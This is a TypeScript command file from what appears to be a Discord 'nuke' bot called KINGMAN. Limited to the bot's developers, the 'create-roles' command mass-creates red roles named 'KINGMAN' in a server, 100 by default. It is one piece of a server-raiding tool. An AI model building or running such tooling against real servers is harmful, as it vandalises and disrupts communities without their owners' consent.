import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "create-roles",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return;
        if(!kmsg.guild) return;
        let ops = { 
            name: "KINGMAN",
            color: "RED",
            number: Number(args[0]) || 100
        }
        await kingman.createRoles(kmsg.guild, ops).catch(e=> {
            console.log(e)
        })
    } 
} as Command